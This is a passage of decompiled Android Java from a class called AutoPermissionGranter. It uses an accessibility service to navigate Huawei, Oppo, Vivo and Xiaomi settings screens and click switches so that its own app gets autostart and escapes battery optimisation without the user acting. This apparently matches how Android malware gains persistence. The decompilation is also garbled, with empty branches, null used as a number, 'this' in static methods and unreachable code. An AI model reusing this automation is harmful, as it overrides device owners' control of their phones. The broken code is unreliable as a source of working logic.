        AccessibilityServiceCore context3 = AutoPermissionGranter.context;
        String result11 = context3.getPackageName();
        Intent result12 = intent2.putExtra(str7, result);
        Intent result13 = intent2.addFlags(context2);
        AccessibilityServiceCore context4 = AutoPermissionGranter.context;
        context4.startActivity(intent2);
        return;
    }

    private static void goToAutoStart() {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String str = "\u81ea\u542f\u52a8";
        AccessibilityNodeInfo result = Sea_rch.searchByText(context, str);
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result2 = result.getParent();
        if (result == null) {
            // branch: cond_0
        }
        int result3 = result.getChildCount();
        int val = result + -0x1;
        AccessibilityNodeInfo result4 = result.getChild(val);
        boolean result5 = result.isCheckable();
        if (result == null) {
            // branch: cond_0
        }
        boolean result6 = result.isChecked();
        if (result != null) {
            // branch: cond_0
        }
        AutoPermissionGranter.click(result);
        return;
    }

    private static void goToBattry() {
        AutoPermissionGranter.ifInCheckVivoBattery = 1;
        Intent intent = new Intent();
        String str = "android.intent.action.POWER_USAGE_SUMMARY";
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        PackageManager result = context.getPackageManager();
        ResolveInfo result2 = result.resolveActivity(intent, null);
        int val = 268435456;
        Intent result3 = intent.addFlags(val);
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityServiceCore context2 = AutoPermissionGranter.context;
        context2.startActivity(intent);
        return;
    }

    private static void goToConsumeEletricityBackgroundManager(int param1) {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String CurrentName = AccessibilityServiceCore.CurrentName;
        AccessibilityNodeInfo result = Sea_rch.searchByText(context, CurrentName);
        if (result == null) {
            // branch: cond_0
        }
        AutoPermissionGranter.ifInCheckVivoBatteryDetails = 1;
        AutoPermissionGranter.2 autoPermissionGranter.2 = new AutoPermissionGranter.2();
        AutoPermissionGranter.clickByGesture(result, autoPermissionGranter.2);
        // continue loop -> :goto_0
        if (/* if-lez autoPermissionGranter.2 */) {
            // branch: cond_1
        }
        AccessibilityServiceCore context2 = AutoPermissionGranter.context;
        String str = "com.vivo.abe:id/list_view";
        AccessibilityNodeInfo result2 = Sea_rch.searchById(context2, str);
        if (result == null) {
            // branch: cond_1
        }
        boolean result3 = result.isScrollable();
        if (result == null) {
            // branch: cond_1
        }
        AutoPermissionGranter.scroll(result);
        int val = 200;
        AutoPermissionGranter.sleep(val);
        int val2 = autoPermissionGranter.2 + -0x1;
        AutoPermissionGranter.goToConsumeEletricityBackgroundManager(val2);
        return;
    }

    private static void goToConsumeEletricityBackgroundManagerList() {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String str = "com.iqoo.powersaving:id/abnormal_power_manager_tv";
        AccessibilityNodeInfo result = Sea_rch.searchById(context, str);
        if (result == null) {
            // branch: cond_0
        }
        AutoPermissionGranter.ifInCheckVivoBatteryList = 1;
        AutoPermissionGranter.click(result);
        return;
    }

    private static void goToHuaWeiBattery(int param1) {
        String[] batteryKeywords = AutoPermissionGranter.batteryKeywords;
        int len = batteryKeywords.length;
        if (null >= len) {
            // branch: cond_1
        }
        String item = batteryKeywords[null];
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        AccessibilityNodeInfo result = Sea_rch.searchByText(context, item);
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result2 = result.getParent();
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result3 = result.getParent();
        AccessibilityNodeInfo result4 = result.getParent();
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result5 = result.getParent();
        AccessibilityNodeInfo result6 = this.getParent();
        AccessibilityNodeInfo result7 = this.getParent();
        AutoPermissionGranter.click(result);
        int val = 1000;
        AutoPermissionGranter.sleep(val);
        AutoPermissionGranter.goToHuaweiBatteryMoreSetting();
        return;
        int val2 = null + 0x1;
        // continue loop -> :goto_0
        if (/* if-lez val */) {
            // branch: cond_2
        }
        AccessibilityServiceCore context2 = AutoPermissionGranter.context;
        String str = "com.android.settings:id/dashboard_container";
        AccessibilityNodeInfo result8 = Sea_rch.searchById(context2, str);
        if (result == null) {
            // branch: cond_3
        }
        boolean result9 = result.isScrollable();
        if (result == null) {
            // branch: cond_3
        }
        AutoPermissionGranter.scroll(result);
        int val3 = 200;
        AutoPermissionGranter.sleep(val3);
        int val4 = val + -0x1;
        AutoPermissionGranter.goToHuaWeiBattery(val4);
        // continue loop -> :goto_1
        AutoPermissionGranter.goToHuaweiSettingAndService();
        return;
    }

    private static void goToHuaWeiSetting() {
        AutoPermissionGranter.ifInCheckHuaWeiBatteryYh = 1;
        AutoPermissionGranter.goToSetting();
        int val = 500;
        AutoPermissionGranter.sleep(val);
        int val2 = 5;
        AutoPermissionGranter.goToHuaWeiBattery(val2);
        return;
    }

    private static void goToHuaweiBatteryMoreSetting() {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String str = "com.huawei.systemmanager:id/list_arrow_more_settings";
        AccessibilityNodeInfo result = Sea_rch.searchById(context, str);
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result2 = result.getParent();
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result3 = result.getParent();
        AccessibilityNodeInfo result4 = result.getParent();
        AutoPermissionGranter.click(result);
        int val = 500;
        AutoPermissionGranter.sleep(val);
        AutoPermissionGranter.clickHuaweiSleepNetwork();
        // continue loop -> :goto_0
        AutoPermissionGranter.goToHuaweiSettingAndService();
        return;
    }

    private static void goToHuaweiSettingAndService() {
        AutoPermissionGranter.ifInCheckHuaWeiBatteryYh = null;
        AutoPermissionGranter.ifInCheckHhuawei = 1;
        Intent intent = new Intent();
        int val = 268435456;
        Intent result = intent.addFlags(val);
        String str = "com.android.settings";
        String str2 = "com.android.settings.Settings$AppAndNotificationDashboardActivity";
        Intent result2 = intent.setClassName(str, str2);
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        context.startActivity(intent);
        return;
    }

    private static void goToOppoAppDetails() {
        AutoPermissionGranter.ifInCheckOppoBatteryYh = null;
        AutoPermissionGranter.ifInCheckOppoAppDetails = 1;
        Intent intent = new Intent();
        String str = "android.settings.APPLICATION_DETAILS_SETTINGS";
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String result = context.getPackageName();
        String str2 = "package";
        Uri result2 = Uri.fromParts(str2, result, null);
        Intent result3 = intent.setData(result);
        int val = 268435456;
        Intent result4 = intent.addFlags(val);
        AccessibilityServiceCore context2 = AutoPermissionGranter.context;
        context2.startActivity(intent);
        return;
    }

    private static void goToOppoBattery(int param1) {
        String[] batteryKeywords = AutoPermissionGranter.batteryKeywords;
        int len = batteryKeywords.length;
        if (null >= len) {
            // branch: cond_1
        }
        String item = batteryKeywords[null];
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        AccessibilityNodeInfo result = Sea_rch.searchByText(context, item);
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result2 = result.getParent();
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result3 = result.getParent();
        AutoPermissionGranter.click(result);
        int val = 1000;
        AutoPermissionGranter.sleep(val);
        AutoPermissionGranter.goToOppoBatteryMoreSetting();
        return;
        int val2 = null + 0x1;
        // continue loop -> :goto_0
        if (/* if-lez val */) {
            // branch: cond_2
        }
        AccessibilityServiceCore context2 = AutoPermissionGranter.context;
        String str = "com.android.settings:id/recycler_view";
        AccessibilityNodeInfo result4 = Sea_rch.searchById(context2, str);
        if (result == null) {
            // branch: cond_3
        }
        boolean result5 = result.isScrollable();
        if (result == null) {
            // branch: cond_3
        }
        AutoPermissionGranter.scroll(result);
        int val3 = 200;
        AutoPermissionGranter.sleep(val3);
        int val4 = val + -0x1;
        AutoPermissionGranter.goToOppoBattery(val4);
        // continue loop -> :goto_1
        AutoPermissionGranter.goToOppoAppDetails();
        return;
    }

    private static void goToOppoBatteryMoreSetting() {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String str = "com.oplus.battery:id/recycler_view";
        AccessibilityNodeInfo result = Sea_rch.searchById(context, str);
        if (result == null) {
            // branch: cond_2
        }
        boolean result2 = result.isScrollable();
        if (result == null) {
            // branch: cond_2
        }
        AutoPermissionGranter.scroll(result);
        AutoPermissionGranter.scroll(result);
        int val = 500;
        AutoPermissionGranter.sleep(val);
        AccessibilityServiceCore context2 = AutoPermissionGranter.context;
        String str2 = "com.oplus.battery:id/coui_preference_widget_jump";
        List result3 = Sea_rch.searchSById(context2, str2);
        if (result == null) {
            // branch: cond_1
        }
        int result4 = result.size();
        int val2 = result + -0x1;
        Object result5 = result.get(val2);
        result = (AccessibilityNodeInfo) result;
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result6 = result.getParent();
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result7 = result.getParent();
        AccessibilityNodeInfo result8 = result.getParent();
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result9 = result.getParent();
        AccessibilityNodeInfo result10 = result.getParent();
        AccessibilityNodeInfo result11 = result.getParent();
        AutoPermissionGranter.click(result);
        AutoPermissionGranter.sleep(val);
        AutoPermissionGranter.goToOppoBatteryMoreSettingYiChangYh();
        // continue loop -> :goto_0
        AutoPermissionGranter.goToOppoAppDetails();
        // continue loop -> :goto_0
        AutoPermissionGranter.goToOppoAppDetails();
        // continue loop -> :goto_0
        AutoPermissionGranter.goToOppoAppDetails();
        return;
    }

    private static void goToOppoBatteryMoreSettingYiChangYh() {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String str = "com.oplus.battery:id/recycler_view";
        AccessibilityNodeInfo result = Sea_rch.searchById(context, str);
        if (result == null) {
            // branch: cond_0
        }
        int val = 2;
        AccessibilityNodeInfo result2 = result.getChild(val);
        if (result == null) {
            // branch: cond_0
        }
        AccessibilityNodeInfo result3 = result.getChild(val);
        AutoPermissionGranter.click(result);
        int val2 = 500;
        AutoPermissionGranter.sleep(val2);
        int val3 = 10;
        AutoPermissionGranter.searchAndClickOppoBatteryNotYh(val3);
        // continue loop -> :goto_0
        AutoPermissionGranter.goToOppoAppDetails();
        return;
    }

    private static void goToOppoSetting() {
        AutoPermissionGranter.ifInCheckOppoBatteryYh = 1;
        AutoPermissionGranter.goToSetting();
        int val = 500;
        AutoPermissionGranter.sleep(val);
        int val2 = 5;
        AutoPermissionGranter.goToOppoBattery(val2);
        return;
    }

    private static void goToSetting() {
        Intent intent = new Intent();
        String str = "android.settings.SETTINGS";
        int val = 268435456;
        Intent result = intent.addFlags(val);
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        context.startActivity(intent);
        return;
    }

    private static void goToXiaomioAppSettingDetails() {
        AutoPermissionGranter.ifInCheckXiaomiAppDetails = 1;
        Intent intent = new Intent();
        String str = "android.settings.APPLICATION_DETAILS_SETTINGS";
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String result = context.getPackageName();
        String str2 = "package";
        Uri result2 = Uri.fromParts(str2, result, null);
        Intent result3 = intent.setData(result);
        int val = 268435456;
        Intent result4 = intent.addFlags(val);
        AccessibilityServiceCore context2 = AutoPermissionGranter.context;
        context2.startActivity(intent);
        return;
    }

    private static void goToXiaomioConsumeEletricityBackgroundManager() {
        AutoPermissionGranter.ifXiaomioConsumeEletricityBackgroundManager = 1;
        Intent intent = new Intent();
        StringBuilder stringBuilder = new StringBuilder();
        String str = "package:";
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String result = context.getPackageName();
        StringBuilder result2 = stringBuilder.append(result);
        String result3 = stringBuilder.toString();
        Uri result4 = Uri.parse(result);
        String str2 = "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS";
        int val = 268435456;
        Intent result5 = intent.addFlags(val);
        AccessibilityServiceCore context2 = AutoPermissionGranter.context;
        context2.startActivity(intent);
        return;
    }

    private static void input(AccessibilityNodeInfo param1, String param2) {
        if (param1 != null) {
            // branch: cond_0
        }
        return;
        Bundle bundle = new Bundle();
        String str = "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE";
        String CurrentName = AccessibilityServiceCore.CurrentName;
        bundle.putCharSequence(str, CurrentName);
        int val = 2097152;
        boolean result = this.performAction(val, bundle);
        int val2 = 100;
        AutoPermissionGranter.sleep(val2);
        return;
    }

    private static void inputAppName(String param1) {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        AccessibilityNodeInfo result = Sea_rch.searchById(context, param1);
        if (result == null) {
            // branch: cond_0
        }
        String CurrentName = AccessibilityServiceCore.CurrentName;
        AutoPermissionGranter.input(result, CurrentName);
        AutoPermissionGranter.checkSwitch();
        return;
    }

    private static void performBack() {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        boolean result = context.performGlobalAction(1);
        return;
    }

    private static void performBackAndHome() {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        boolean result = context.performGlobalAction(1);
        AccessibilityServiceCore context2 = AutoPermissionGranter.context;
        int val = 2;
        boolean result2 = context2.performGlobalAction(val);
        return;
    }

    private static void performHome() {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        int val = 2;
        boolean result = context.performGlobalAction(val);
        return;
    }

    private static void scroll(AccessibilityNodeInfo param1) {
        if (param1 == null) {
            // branch: cond_0
        }
        boolean result = this.isScrollable();
        if (result == null) {
            // branch: cond_0
        }
        int val = 4096;
        boolean result2 = this.performAction(val);
        return;
    }

    private static void searchAndClickOppoBatteryNotYh(int param1) {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        String str = "com.oplus.battery:id/animated_hint_layout";
        AccessibilityNodeInfo result = Sea_rch.searchById(context, str);
        if (result == null) {
            // branch: cond_0
        }
        AutoPermissionGranter.click(result);
        int val = 150;
        AutoPermissionGranter.sleep(val);
        String str2 = "com.oplus.battery:id/search_src_text";
        AutoPermissionGranter.inputAppName(str2);
        int val2 = 700;
        AutoPermissionGranter.sleep(val2);
        AccessibilityServiceCore context2 = AutoPermissionGranter.context;
        String str3 = "com.oplus.battery:id/relativeLayout";
        AccessibilityNodeInfo result2 = Sea_rch.searchById(context2, str3);
        if (result == null) {
            // branch: cond_1
        }
        AutoPermissionGranter.7 autoPermissionGranter.7 = new AutoPermissionGranter.7();
        AutoPermissionGranter.clickByGesture(result, autoPermissionGranter.7);
        // continue loop -> :goto_0
        AutoPermissionGranter.goToOppoAppDetails();
        return;
    }

    private static List searchSById(String param1) {
        AccessibilityServiceCore context = AutoPermissionGranter.context;
        AccessibilityNodeInfo result = context.getRootInActiveWindow();
        List result2 = result.findAccessibilityNodeInfosByViewId(param1);
        return result;
    }

    private static void sleep(int param1) {
        try {
            long longVal = (long) param1;
            Thread.sleep(longVal, v1);
            return;
            } catch (Exception e) {
                e.printStackTrace();
            RuntimeException runtimeException = new RuntimeException();
            throw new RuntimeException(runtimeException.toString());
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void start(AccessibilityServiceCore param1) {
        try {
            AutoPermissionGranter.context = param1;
            AutoPermissionGranter.checkDevice();
            // continue loop -> :goto_0
            } catch (Exception e) {
                e.printStackTrace();
            this.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}